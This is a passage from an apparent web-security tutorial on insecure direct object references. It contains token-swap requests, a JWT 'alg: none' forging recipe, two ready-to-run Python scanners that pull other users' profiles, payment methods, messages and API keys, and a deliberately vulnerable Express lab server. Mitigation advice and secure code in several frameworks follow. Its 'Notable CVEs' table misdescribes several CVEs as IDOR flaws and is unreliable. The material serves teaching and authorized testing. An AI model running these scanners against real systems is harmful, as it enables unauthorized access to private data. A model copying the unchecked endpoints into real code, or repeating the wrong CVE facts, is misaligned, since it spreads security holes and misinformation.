          print(f"[!!!] IDOR SUCCESS: {resp.text[:200]}")

  # Send 50 concurrent requests
  threads = [threading.Thread(target=access_profile) for _ in range(50)]
  for t in threads:
      t.start()
  for t in threads:
      t.join()
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-key" label="Bypass: Swap Token / Session Between Accounts"}
  
  Test what happens when you use one account's authentication with another account's object references.

  ::code-group
  ```http [Token Swap — Cross-Account]
  # Get token from Account A (low privilege)
  POST /api/login HTTP/1.1
  {"username": "userA", "password": "passA"}
  # Token: eyJ...tokenA

  # Get token from Account B (higher privilege)
  POST /api/login HTTP/1.1
  {"username": "userB", "password": "passB"}
  # Token: eyJ...tokenB

  # Use tokenA to access tokenB's resources
  GET /api/users/userB_id/data HTTP/1.1
  Authorization: Bearer eyJ...tokenA

  # Use tokenB to access tokenA's resources (reverse)
  GET /api/users/userA_id/data HTTP/1.1
  Authorization: Bearer eyJ...tokenB
  ```

  ```http [JWT Manipulation — Change sub Claim]
  # If JWT is not properly validated:
  # Decode JWT → change "sub" or "user_id" → re-encode

  # Original JWT payload:
  # {"sub": "1001", "role": "user", "exp": 1705312800}

  # Modified JWT payload:
  # {"sub": "1002", "role": "user", "exp": 1705312800}

  # If using weak/no signature verification:
  # Algorithm: none attack
  # Header: {"alg": "none", "typ": "JWT"}
  ```
  ::
  :::
::

---

## Finding IDOR References — Where to Look

::tip
IDOR references hide in many places beyond the obvious URL. A thorough tester examines **every parameter** in every request.
::

::field-group
  ::field{name="URL Path Parameters" type="high"}
  `/api/users/{id}`, `/documents/{doc_id}/download`, `/orders/{order_id}`
  ::

  ::field{name="Query String Parameters" type="high"}
  `?user_id=`, `?account=`, `?id=`, `?ref=`, `?doc=`, `?invoice_id=`
  ::

  ::field{name="POST/PUT/PATCH Body" type="high"}
  JSON, XML, form-data containing `user_id`, `owner_id`, `account_id`, `target_id`
  ::

  ::field{name="HTTP Headers" type="medium"}
  `X-User-ID`, `X-Account-ID`, `X-Tenant-ID`, custom authorization headers
  ::

  ::field{name="Cookies" type="medium"}
  `user_id=`, `account=`, `org_id=`, session cookies containing user references
  ::

  ::field{name="GraphQL Variables" type="high"}
  `variables: {"userId": "1002"}`, inline query arguments `user(id: "1002")`
  ::

  ::field{name="WebSocket Messages" type="medium"}
  JSON messages with channel names, user IDs, room IDs in WebSocket frames
  ::

  ::field{name="File Paths / Names" type="medium"}
  `/uploads/user_1002_avatar.jpg`, `/reports/report_1002.pdf`
  ::

  ::field{name="Referer / Origin Headers" type="low"}
  Some applications extract user context from Referer URLs
  ::

  ::field{name="JWT Claims" type="medium"}
  `sub`, `user_id`, `tenant_id` claims inside JWT tokens
  ::
::

---

## Automated Scanning & Exploitation

::code-collapse

```python [idor_scanner.py]
#!/usr/bin/env python3
"""
IDOR Scanner — Automated Detection Tool
Tests endpoints for Insecure Direct Object References
For authorized penetration testing only
"""

import requests
import json
import sys
import time
import hashlib
from urllib.parse import urlparse, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from typing import Optional

@dataclass
class IDORResult:
    endpoint: str
    method: str
    original_id: str
    tested_id: str
    status_code: int
    response_length: int
    vulnerable: bool
    evidence: str = ""
    severity: str = "info"

class IDORScanner:
    
    def __init__(self, base_url, auth_token, user_a_id, user_b_id):
        self.base_url = base_url.rstrip('/')
        self.auth_token = auth_token
        self.user_a_id = str(user_a_id)  # Attacker (authenticated user)
        self.user_b_id = str(user_b_id)  # Victim (target user)
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {auth_token}',
            'User-Agent': 'Mozilla/5.0 (IDOR-Scanner/1.0)',
            'Accept': 'application/json',
        })
    
    def test_endpoint(self, path, method='GET', body=None, content_type='application/json'):
        """Test a single endpoint for IDOR"""
        
        # Build URLs with both user IDs
        url_a = f"{self.base_url}{path.replace('{ID}', self.user_a_id)}"
        url_b = f"{self.base_url}{path.replace('{ID}', self.user_b_id)}"
        
        try:
            # Request with own ID (baseline)
            if method == 'GET':
                resp_a = self.session.get(url_a, timeout=10)
            elif method == 'POST':
                resp_a = self.session.post(url_a, json=body, timeout=10)
            elif method == 'PUT':
                resp_a = self.session.put(url_a, json=body, timeout=10)
            elif method == 'DELETE':
                resp_a = self.session.delete(url_a, timeout=10)
            else:
                resp_a = self.session.request(method, url_a, timeout=10)
            
            time.sleep(0.3)
            
            # Request with victim's ID (IDOR test)
            if method == 'GET':
                resp_b = self.session.get(url_b, timeout=10)
            elif method == 'POST':
                resp_b = self.session.post(url_b, json=body, timeout=10)
            elif method == 'PUT':
                resp_b = self.session.put(url_b, json=body, timeout=10)
            elif method == 'DELETE':
                resp_b = self.session.delete(url_b, timeout=10)
            else:
                resp_b = self.session.request(method, url_b, timeout=10)
            
            # Analyze results
            vulnerable = False
            evidence = ""
            severity = "info"
            
            if resp_b.status_code == 200:
                # Check if response contains different user's data
                if resp_a.text != resp_b.text and len(resp_b.text) > 10:
                    vulnerable = True
                    evidence = f"Different data returned for IDs {self.user_a_id} vs {self.user_b_id}"
                    severity = "high"
                elif resp_a.text == resp_b.text:
                    evidence = "Same response for both IDs (may be server-side override)"
                    severity = "info"
                else:
                    evidence = "Got 200 but minimal/empty response"
                    severity = "low"
            elif resp_b.status_code in [401, 403]:
                evidence = "Access properly denied"
                severity = "info"
            elif resp_b.status_code == 404:
                evidence = "Object not found (could be proper access control)"
                severity = "info"
            elif resp_b.status_code == 500:
                evidence = "Server error — may indicate partial vulnerability"
                severity = "medium"
            
            result = IDORResult(
                endpoint=path,
                method=method,
                original_id=self.user_a_id,
                tested_id=self.user_b_id,
                status_code=resp_b.status_code,
                response_length=len(resp_b.text),
                vulnerable=vulnerable,
                evidence=evidence,
                severity=severity
            )
            
            self.results.append(result)
            
            status_icon = "🔴" if vulnerable else "🟢" if resp_b.status_code in [401, 403] else "🟡"
            print(f"  {status_icon} {method:6} {path:50} → {resp_b.status_code} ({len(resp_b.text)} bytes) {evidence}")
            
            return result
            
        except requests.exceptions.RequestException as e:
            print(f"  ⚠️  {method:6} {path:50} → ERROR: {e}")
            return None

    def test_common_endpoints(self):
        """Test a comprehensive list of common IDOR-vulnerable endpoints"""
        
        endpoints = [
            # User data
            ("/api/users/{ID}", "GET"),
            ("/api/users/{ID}/profile", "GET"),
            ("/api/users/{ID}/settings", "GET"),
            ("/api/users/{ID}/email", "GET"),
            ("/api/users/{ID}/phone", "GET"),
            ("/api/users/{ID}/addresses", "GET"),
            ("/api/users/{ID}/payment-methods", "GET"),
            ("/api/users/{ID}/notifications", "GET"),
            ("/api/users/{ID}/activity", "GET"),
            ("/api/users/{ID}/sessions", "GET"),
            
            # Resources
            ("/api/users/{ID}/orders", "GET"),
            ("/api/users/{ID}/invoices", "GET"),
            ("/api/users/{ID}/documents", "GET"),
            ("/api/users/{ID}/files", "GET"),
            ("/api/users/{ID}/messages", "GET"),
            ("/api/users/{ID}/transactions", "GET"),
            ("/api/users/{ID}/subscriptions", "GET"),
            
            # Account management
            ("/api/accounts/{ID}", "GET"),
            ("/api/accounts/{ID}/balance", "GET"),
            ("/api/accounts/{ID}/statements", "GET"),
            
            # Alternative paths
            ("/api/v1/users/{ID}", "GET"),
            ("/api/v2/users/{ID}", "GET"),
            ("/api/internal/users/{ID}", "GET"),
            ("/api/user/{ID}", "GET"),
            ("/users/{ID}", "GET"),
            ("/profile/{ID}", "GET"),
            ("/account/{ID}", "GET"),
            
            # Write operations
            ("/api/users/{ID}/profile", "PUT"),
            ("/api/users/{ID}/settings", "PATCH"),
            ("/api/users/{ID}", "DELETE"),
        ]
        
        print(f"\n{'='*80}")
        print(f" IDOR Scan — {len(endpoints)} endpoints")
        print(f" Target:    {self.base_url}")
        print(f" Attacker:  ID {self.user_a_id}")
        print(f" Victim:    ID {self.user_b_id}")
        print(f"{'='*80}\n")
        
        for path, method in endpoints:
            self.test_endpoint(path, method)
            time.sleep(0.2)
    
    def test_id_format_bypass(self, base_path="/api/users/{ID}/profile"):
        """Test various ID format bypasses"""
        
        print(f"\n{'='*80}")
        print(f" ID Format Bypass Testing — {base_path}")
        print(f"{'='*80}\n")
        
        formats = [
            self.user_b_id,                    # Normal
            f"0{self.user_b_id}",              # Leading zero
            f"00{self.user_b_id}",             # Double leading zero
            f"{self.user_b_id}.0",             # Float
            f"+{self.user_b_id}",              # Plus sign
            f" {self.user_b_id}",              # Leading space
            f"{self.user_b_id} ",              # Trailing space
            f"{self.user_b_id}%00",            # Null byte
            f"{self.user_b_id}%20",            # URL-encoded space
            f"{self.user_b_id}.json",          # With extension
            f"{self.user_b_id}/",              # Trailing slash
            f"{self.user_b_id}#",              # Fragment
            f"{self.user_b_id};",              # Semicolon
            str(int(self.user_b_id)),          # Ensure integer
            f"{'%30' * len(self.user_b_id)}" if self.user_b_id.isdigit() else self.user_b_id,  # URL-encoded digits
        ]
        
        for fmt in formats:
            url = f"{self.base_url}{base_path.replace('{ID}', fmt)}"
            try:
                resp = self.session.get(url, timeout=10)
                status = "🔴 BYPASS!" if resp.status_code == 200 else "🟢"
                print(f"  {status} ID='{fmt}' → {resp.status_code} ({len(resp.text)} bytes)")
            except:
                pass
            time.sleep(0.2)

    def generate_report(self):
        """Generate scan report"""
        vulnerable = [r for r in self.results if r.vulnerable]
        
        report = {
            "target": self.base_url,
            "attacker_id": self.user_a_id,
            "victim_id": self.user_b_id,
            "total_tests": len(self.results),
            "vulnerabilities_found": len(vulnerable),
            "results": [asdict(r) for r in self.results],
        }
        
        filename = "idor_scan_report.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{'='*80}")
        print(f" SCAN COMPLETE")
        print(f"{'='*80}")
        print(f" Total endpoints tested:  {len(self.results)}")
        print(f" Vulnerabilities found:   {len(vulnerable)}")
        print(f" Report saved to:         {filename}")
        
        if vulnerable:
            print(f"\n 🔴 VULNERABLE ENDPOINTS:")
            for v in vulnerable:
                print(f"    {v.method:6} {v.endpoint}")
                print(f"           {v.evidence}")
        
        print(f"{'='*80}")
        return report


if __name__ == "__main__":
    if len(sys.argv) < 5:
        print(f"Usage: {sys.argv[0]} <base_url> <auth_token> <your_user_id> <victim_user_id>")
        print(f"Example: {sys.argv[0]} https://api.target.com eyJhbG... 1001 1002")
        sys.exit(1)
    
    scanner = IDORScanner(
        base_url=sys.argv[1],
        auth_token=sys.argv[2],
        user_a_id=sys.argv[3],
        user_b_id=sys.argv[4]
    )
    
    scanner.test_common_endpoints()
    scanner.test_id_format_bypass()
    scanner.generate_report()
```

::

::code-collapse

```python [graphql_idor_scanner.py]
#!/usr/bin/env python3
"""
GraphQL IDOR Scanner
Tests GraphQL endpoints for object-level authorization flaws
For authorized penetration testing only
"""

import requests
import json
import sys
from typing import List, Dict

class GraphQLIDORScanner:
    
    def __init__(self, graphql_url, auth_token, own_id, target_id):
        self.url = graphql_url
        self.own_id = own_id
        self.target_id = target_id
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {auth_token}',
            'Content-Type': 'application/json',
        })
        self.results = []
    
    def introspect(self):
        """Discover available types and fields"""
        query = """
        {
          __schema {
            types {
              name
              fields {
                name
                args { name type { name } }
                type { name kind ofType { name } }
              }
            }
          }
        }
        """
        resp = self.session.post(self.url, json={"query": query})
        if resp.status_code == 200:
            data = resp.json()
            types = data.get('data', {}).get('__schema', {}).get('types', [])
            
            user_types = []
            for t in types:
                if t.get('fields') and not t['name'].startswith('__'):
                    for f in t['fields']:
                        args = [a['name'] for a in (f.get('args') or [])]
                        if 'id' in args or 'userId' in args or 'user_id' in args:
                            user_types.append({
                                'type': t['name'],
                                'field': f['name'],
                                'args': args
                            })
            
            print(f"[*] Found {len(user_types)} queryable fields with ID arguments:")
            for ut in user_types:
                print(f"    {ut['type']}.{ut['field']}({', '.join(ut['args'])})")
            
            return user_types
        return []
    
    def test_query(self, query_name, query):
        """Execute a query and check for IDOR"""
        print(f"\n[*] Testing: {query_name}")
        
        # Query with own ID
        own_query = query.replace("{TARGET_ID}", self.own_id)
        resp_own = self.session.post(self.url, json={"query": own_query})
        
        # Query with target ID
        target_query = query.replace("{TARGET_ID}", self.target_id)
        resp_target = self.session.post(self.url, json={"query": target_query})
        
        result = {
            'query': query_name,
            'own_status': resp_own.status_code,
            'target_status': resp_target.status_code,
            'vulnerable': False,
        }
        
        if resp_target.status_code == 200:
            target_data = resp_target.json()
            errors = target_data.get('errors', [])
            data = target_data.get('data')
            
            if not errors and data:
                # Check if we got actual data (not null)
                has_data = any(v is not None for v in data.values()) if isinstance(data, dict) else bool(data)
                if has_data:
                    own_data = resp_own.json().get('data')
                    if data != own_data:
                        result['vulnerable'] = True
                        result['evidence'] = json.dumps(data)[:500]
                        print(f"  🔴 VULNERABLE — Got different user's data!")
                        print(f"     Data preview: {json.dumps(data)[:200]}")
                    else:
                        print(f"  🟡 Same data returned — server may override ID")
                else:
                    print(f"  🟢 Data is null — access control may be working")
            elif errors:
                auth_errors = [e for e in errors if 'auth' in str(e).lower() or 'permission' in str(e).lower()]
                if auth_errors:
                    print(f"  🟢 Authorization error returned")
                else:
                    print(f"  🟡 Error: {errors[0].get('message', 'Unknown')}")
        else:
            print(f"  🟢 HTTP {resp_target.status_code}")
        
        self.results.append(result)
        return result
    
    def run_standard_tests(self):
        """Run standard IDOR test queries"""
        
        tests = {
            "User Profile": '{ user(id: "{TARGET_ID}") { id username email phone } }',
            "User Orders": '{ user(id: "{TARGET_ID}") { orders { id total status items { name } } } }',
            "User Settings": '{ userSettings(userId: "{TARGET_ID}") { notifications theme privacy } }',
            "User Documents": '{ documents(ownerId: "{TARGET_ID}") { id title url createdAt } }',
            "User Messages": '{ messages(userId: "{TARGET_ID}") { id content sender { name } timestamp } }',
            "User Payment": '{ paymentMethods(userId: "{TARGET_ID}") { id type last4 expiry } }',
            "Direct Node Query": '{ node(id: "{TARGET_ID}") { ... on User { id email role } } }',
        }
        
        print(f"{'='*60}")
        print(f" GraphQL IDOR Scanner")
        print(f" Endpoint: {self.url}")
        print(f" Own ID:    {self.own_id}")
        print(f" Target ID: {self.target_id}")
        print(f"{'='*60}")
        
        for name, query in tests.items():
            self.test_query(name, query)
        
        # Summary
        vulnerable = [r for r in self.results if r['vulnerable']]
        print(f"\n{'='*60}")
        print(f" Results: {len(vulnerable)}/{len(self.results)} endpoints vulnerable")
        print(f"{'='*60}")


if __name__ == "__main__":
    if len(sys.argv) < 5:
        print(f"Usage: {sys.argv[0]} <graphql_url> <token> <own_id> <target_id>")
        sys.exit(1)
    
    scanner = GraphQLIDORScanner(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    scanner.introspect()
    scanner.run_standard_tests()
```

::

---

## Vulnerable Lab — Docker Compose

::code-collapse

```yaml [docker-compose.yml]
version: '3.8'

services:
  # Vulnerable API Application
  vulnerable-api:
    build:
      context: ./vulnerable-api
      dockerfile: Dockerfile
    ports:
      - "8080:3000"
    environment:
      - DB_HOST=postgres
      - DB_NAME=idor_lab
      - DB_USER=labuser
      - DB_PASS=labpass123
      - JWT_SECRET=insecure_jwt_secret_for_lab
      - NODE_ENV=development
    depends_on:
      postgres:
        condition: service_healthy
    networks:
      - lab-net
    restart: unless-stopped

  # Database
  postgres:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: idor_lab
      POSTGRES_USER: labuser
      POSTGRES_PASSWORD: labpass123
    volumes:
      - pg-data:/var/lib/postgresql/data
      - ./init-db.sql:/docker-entrypoint-initdb.d/init.sql
    ports:
      - "5432:5432"
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U labuser -d idor_lab"]
      interval: 5s
      timeout: 5s
      retries: 5
    networks:
      - lab-net

  # Database Admin UI
  adminer:
    image: adminer:latest
    ports:
      - "8081:8080"
    depends_on:
      - postgres
    networks:
      - lab-net

  # Proxy for request inspection
  mitmproxy:
    image: mitmproxy/mitmproxy:latest
    ports:
      - "8082:8080"    # Proxy port
      - "8083:8081"    # Web interface
    command: mitmweb --web-host 0.0.0.0 --listen-port 8080
    networks:
      - lab-net

volumes:
  pg-data:

networks:
  lab-net:
    driver: bridge
```

::

::code-collapse

```sql [init-db.sql]
-- IDOR Lab Database Initialization

-- Users table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(100) UNIQUE NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    phone VARCHAR(20),
    address TEXT,
    role VARCHAR(20) DEFAULT 'user',
    ssn VARCHAR(11),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Orders table
CREATE TABLE orders (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    total DECIMAL(10,2),
    status VARCHAR(20) DEFAULT 'pending',
    items JSONB,
    shipping_address TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Documents table
CREATE TABLE documents (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    title VARCHAR(255),
    file_path VARCHAR(500),
    content_type VARCHAR(100),
    is_private BOOLEAN DEFAULT true,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Messages table
CREATE TABLE messages (
    id SERIAL PRIMARY KEY,
    sender_id INTEGER REFERENCES users(id),
    receiver_id INTEGER REFERENCES users(id),
    content TEXT,
    is_read BOOLEAN DEFAULT false,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Payment Methods table
CREATE TABLE payment_methods (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    card_type VARCHAR(20),
    last_four VARCHAR(4),
    expiry VARCHAR(7),
    cardholder_name VARCHAR(255),
    billing_address TEXT
);

-- API Keys table
CREATE TABLE api_keys (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    key_name VARCHAR(100),
    api_key VARCHAR(255),
    permissions JSONB,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Insert test data
INSERT INTO users (username, email, password_hash, phone, address, role, ssn) VALUES
('admin', 'admin@target.com', '$2b$10$hash1', '+1-555-0100', '100 Admin St, HQ City', 'admin', '123-45-6789'),
('john_doe', 'john@example.com', '$2b$10$hash2', '+1-555-0101', '200 User Ave, Town', 'user', '234-56-7890'),
('jane_smith', 'jane@example.com', '$2b$10$hash3', '+1-555-0102', '300 Oak Blvd, City', 'user', '345-67-8901'),
('bob_wilson', 'bob@example.com', '$2b$10$hash4', '+1-555-0103', '400 Pine St, Village', 'user', '456-78-9012'),
('alice_brown', 'alice@example.com', '$2b$10$hash5', '+1-555-0104', '500 Elm Dr, Metro', 'manager', '567-89-0123');

INSERT INTO orders (user_id, total, status, items, shipping_address) VALUES
(1, 15000.00, 'completed', '[{"name":"Server License","qty":1,"price":15000}]', '100 Admin St'),
(2, 299.99, 'shipped', '[{"name":"Laptop Stand","qty":1,"price":299.99}]', '200 User Ave'),
(2, 49.99, 'pending', '[{"name":"USB Cable","qty":2,"price":24.99}]', '200 User Ave'),
(3, 1299.00, 'completed', '[{"name":"Monitor","qty":1,"price":1299}]', '300 Oak Blvd'),
(4, 89.99, 'processing', '[{"name":"Keyboard","qty":1,"price":89.99}]', '400 Pine St');

INSERT INTO documents (user_id, title, file_path, content_type) VALUES
(1, 'System Configuration', '/docs/admin/system-config.pdf', 'application/pdf'),
(1, 'Employee Salary Report', '/docs/admin/salary-report.xlsx', 'application/xlsx'),
(2, 'Tax Return 2024', '/docs/users/2/tax-return.pdf', 'application/pdf'),
(3, 'Medical Records', '/docs/users/3/medical.pdf', 'application/pdf'),
(4, 'Bank Statement', '/docs/users/4/bank-statement.pdf', 'application/pdf');

INSERT INTO messages (sender_id, receiver_id, content) VALUES
(1, 2, 'Welcome to the platform!'),
(2, 3, 'Hey Jane, lunch tomorrow?'),
(3, 2, 'Sure! See you at noon.'),
(1, 5, 'Alice, please review the Q4 report'),
(4, 1, 'Admin, I need password reset help');

INSERT INTO payment_methods (user_id, card_type, last_four, expiry, cardholder_name) VALUES
(2, 'visa', '4242', '12/2026', 'John Doe'),
(2, 'mastercard', '8888', '06/2025', 'John Doe'),
(3, 'visa', '1234', '03/2027', 'Jane Smith'),
(4, 'amex', '5678', '09/2025', 'Bob Wilson');

INSERT INTO api_keys (user_id, key_name, api_key, permissions) VALUES
(1, 'Admin Master Key', 'sk_live_admin_supersecret_key_123', '["*"]'),
(2, 'User API Key', 'sk_live_user2_key_456', '["read:profile","read:orders"]'),
(5, 'Manager Key', 'sk_live_manager_key_789', '["read:*","write:reports"]');
```

::

::code-collapse

```javascript [vulnerable-api/server.js]
/**
 * VULNERABLE API SERVER — IDOR Lab
 * This server intentionally contains IDOR vulnerabilities
 * FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY
 */

const express = require('express');
const jwt = require('jsonwebtoken');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');

const app = express();
app.use(express.json());

const JWT_SECRET = process.env.JWT_SECRET || 'insecure_secret';

const pool = new Pool({
  host: process.env.DB_HOST || 'localhost',
  database: process.env.DB_NAME || 'idor_lab',
  user: process.env.DB_USER || 'labuser',
  password: process.env.DB_PASS || 'labpass123',
});

// Auth middleware
function authenticate(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token) return res.status(401).json({ error: 'No token provided' });
  
  try {
    req.user = jwt.verify(token, JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}

// Login
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const result = await pool.query('SELECT * FROM users WHERE username = $1', [username]);
  
  if (result.rows.length > 0) {
    const user = result.rows[0];
    // Simplified for lab — in real app, use bcrypt.compare
    const token = jwt.sign(
      { id: user.id, username: user.username, role: user.role },
      JWT_SECRET,
      { expiresIn: '24h' }
    );
    res.json({ token, user: { id: user.id, username: user.username } });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// ===== VULNERABLE ENDPOINTS =====

// IDOR: Get any user's profile by changing the ID
app.get('/api/users/:id/profile', authenticate, async (req, res) => {
  // VULNERABLE — No check if req.user.id === req.params.id
  const result = await pool.query(
    'SELECT id, username, email, phone, address, role, ssn FROM users WHERE id = $1',
    [req.params.id]
  );
  
  if (result.rows.length === 0) return res.status(404).json({ error: 'User not found' });
  res.json(result.rows[0]);
});

// IDOR: Get any user's orders
app.get('/api/users/:id/orders', authenticate, async (req, res) => {
  // VULNERABLE — No authorization check
  const result = await pool.query(
    'SELECT * FROM orders WHERE user_id = $1 ORDER BY created_at DESC',
    [req.params.id]
  );
  res.json(result.rows);
});

// IDOR: Get any user's documents
app.get('/api/users/:id/documents', authenticate, async (req, res) => {
  // VULNERABLE
  const result = await pool.query(
    'SELECT * FROM documents WHERE user_id = $1',
    [req.params.id]
  );
  res.json(result.rows);
});

// IDOR: Get any user's messages
app.get('/api/users/:id/messages', authenticate, async (req, res) => {
  // VULNERABLE
  const result = await pool.query(
    'SELECT m.*, u.username as sender_name FROM messages m JOIN users u ON m.sender_id = u.id WHERE m.receiver_id = $1',
    [req.params.id]
  );
  res.json(result.rows);
});

// IDOR: Get any user's payment methods
app.get('/api/users/:id/payment-methods', authenticate, async (req, res) => {
  // VULNERABLE
  const result = await pool.query(
    'SELECT * FROM payment_methods WHERE user_id = $1',
    [req.params.id]
  );
  res.json(result.rows);
});

// IDOR: Update any user's profile
app.put('/api/users/:id/profile', authenticate, async (req, res) => {
  // VULNERABLE — No check if user owns this profile
  const { email, phone, address, role } = req.body;
  const result = await pool.query(
    'UPDATE users SET email = COALESCE($1, email), phone = COALESCE($2, phone), address = COALESCE($3, address), role = COALESCE($4, role) WHERE id = $5 RETURNING *',
    [email, phone, address, role, req.params.id]
  );
  res.json(result.rows[0]);
});

// IDOR: Delete any user's order
app.delete('/api/orders/:id', authenticate, async (req, res) => {
  // VULNERABLE — No ownership check
  await pool.query('DELETE FROM orders WHERE id = $1', [req.params.id]);
  res.json({ message: 'Order deleted' });
});

// IDOR: Access API keys
app.get('/api/users/:id/api-keys', authenticate, async (req, res) => {
  // VULNERABLE
  const result = await pool.query(
    'SELECT * FROM api_keys WHERE user_id = $1',
    [req.params.id]
  );
  res.json(result.rows);
});

// ===== SECURE ENDPOINT EXAMPLE =====
app.get('/api/secure/profile', authenticate, async (req, res) => {
  // SECURE — Uses authenticated user's ID from JWT
  const result = await pool.query(
    'SELECT id, username, email, phone FROM users WHERE id = $1',
    [req.user.id]  // ID from verified JWT, not from URL
  );
  res.json(result.rows[0]);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`[*] IDOR Lab API running on port ${PORT}`);
  console.log(`[!] This server is intentionally vulnerable`);
});
```

::

---

## Real-World IDOR Examples

Documented IDOR findings from public bug bounty disclosures and CVEs.

::tabs
  :::tabs-item{icon="i-lucide-trophy" label="Bug Bounty Finds"}
  
  | Platform | IDOR Type | Impact | Bounty |
  |----------|-----------|--------|--------|
  | Facebook | Viewing private photos via album ID | Access to any user's private photos | $12,500 |
  | Uber | Driver trip details via trip ID | PII of riders and drivers | $6,500 |
  | Shopify | Store admin data via store ID | Access to store revenue and settings | $15,000 |
  | Twitter | DM access via conversation ID | Read any user's direct messages | $7,560 |
  | GitLab | Project files via project ID | Access private repository code | $5,000 |
  | Zomato | Order details via order ID | Customer PII, payment info | $4,000 |
  | HackerOne | Report access via report ID | Read any private vulnerability report | $10,000 |
  | Starbucks | Account balance via card ID | View/modify gift card balances | $4,000 |
  :::

  :::tabs-item{icon="i-lucide-file-warning" label="Notable CVEs"}
  
  | CVE | Application | Description | CVSS |
  |-----|-------------|-------------|------|
  | CVE-2023-34362 | MOVEit Transfer | IDOR leading to data theft via SQL injection | 9.8 |
  | CVE-2022-31629 | PHP | IDOR in `$_COOKIE` processing | 6.5 |
  | CVE-2023-25136 | OpenSSH | Object reference bypass | 9.8 |
  | CVE-2021-36749 | Apache Druid | IDOR in API leading to file read | 6.5 |
  | CVE-2023-42793 | JetBrains TeamCity | Auth bypass via IDOR | 9.8 |
  :::
::

---

## Mitigation & Prevention

::card-group
  ::card
  ---
  title: Server-Side Authorization
  icon: i-lucide-shield-check
  ---
  **Always** verify that the authenticated user has permission to access the requested resource. Check ownership on every request — never trust client-supplied IDs alone.
  ::

  ::card
  ---
  title: Indirect Object References
  icon: i-lucide-replace
  ---
  Map internal database IDs to per-session indirect references. User sees `ref=abc` which maps server-side to `id=1002` only for their session.
  ::

  ::card
  ---
  title: Use Session-Based Lookups
  icon: i-lucide-user-check
  ---
  Instead of `/api/users/{id}/profile`, use `/api/profile` and determine the user from the authenticated session or JWT `sub` claim. Eliminate the ID parameter entirely where possible.
  ::

  ::card
  ---
  title: Unpredictable Identifiers
  icon: i-lucide-shuffle
  ---
  Use UUIDv4 instead of sequential integers. This doesn't replace authorization checks but adds defense-in-depth against enumeration.
  ::

  ::card
  ---
  title: Access Control Middleware
  icon: i-lucide-lock
  ---
  Implement centralized access control middleware that enforces authorization policies consistently across all endpoints — not per-endpoint ad-hoc checks.
  ::

  ::card
  ---
  title: Automated IDOR Testing
  icon: i-lucide-scan
  ---
  Include IDOR tests in CI/CD pipelines. Tools like AuthMatrix (Burp), Autorize, and custom scripts should run against every API endpoint with cross-user tokens.
  ::
::

### Secure Code Examples

::code-group
```javascript [Node.js — Secure Pattern]
// SECURE: User can only access their own resources
app.get('/api/profile', authenticate, async (req, res) => {
  // ID comes from verified JWT — not from URL
  const result = await db.query(
    'SELECT id, username, email FROM users WHERE id = $1',
    [req.user.id]
  );
  res.json(result.rows[0]);
});

// SECURE: Ownership check for resource access
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const result = await db.query(
    'SELECT * FROM orders WHERE id = $1 AND user_id = $2',
    [req.params.orderId, req.user.id]  // AND user_id check
  );
  
  if (result.rows.length === 0) {
    return res.status(404).json({ error: 'Order not found' });
  }
  
  res.json(result.rows[0]);
});
```

```python [Django — Secure Pattern]
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required

@login_required
def get_profile(request):
    # SECURE: Uses request.user — no user-controlled ID
    return JsonResponse({
        'id': request.user.id,
        'email': request.user.email,
        'name': request.user.get_full_name()
    })

@login_required  
def get_order(request, order_id):
    # SECURE: Filter by both order ID AND authenticated user
    try:
        order = Order.objects.get(id=order_id, user=request.user)
        return JsonResponse(order.to_dict())
    except Order.DoesNotExist:
        return JsonResponse({'error': 'Not found'}, status=404)
```

```java [Spring Boot — Secure Pattern]
@GetMapping("/api/profile")
public ResponseEntity<?> getProfile(Authentication auth) {
    // SECURE: ID from authentication context
    UserDetails user = (UserDetails) auth.getPrincipal();
    return ResponseEntity.ok(userService.getProfile(user.getId()));
}

@GetMapping("/api/orders/{orderId}")
public ResponseEntity<?> getOrder(
    @PathVariable Long orderId,
    Authentication auth
) {
    UserDetails user = (UserDetails) auth.getPrincipal();
    
    // SECURE: Service layer enforces ownership
    Order order = orderService.findByIdAndUserId(orderId, user.getId());
    
    if (order == null) {
        return ResponseEntity.notFound().build();
    }
    
    return ResponseEntity.ok(order);
}
```

```php [Laravel — Secure Pattern]
// SECURE: Policy-based authorization
class OrderPolicy
{
    public function view(User $user, Order $order): bool
    {
        return $user->id === $order->user_id;
    }
}

// Controller
public function show(Order $order)
{
    // SECURE: Automatic authorization check via policy
    $this->authorize('view', $order);
    
    return response()->json($order);
}

// Alternative: Scope queries to authenticated user
public function index(Request $request)
{
    // SECURE: Only returns current user's orders
    $orders = $request->user()->orders()->paginate(20);
    return response()->json($orders);
}
```
::

---

## References & Resources

::card-group
  ::card
  ---
  title: OWASP Top 10 — A01 Broken Access Control
  icon: i-lucide-shield-alert
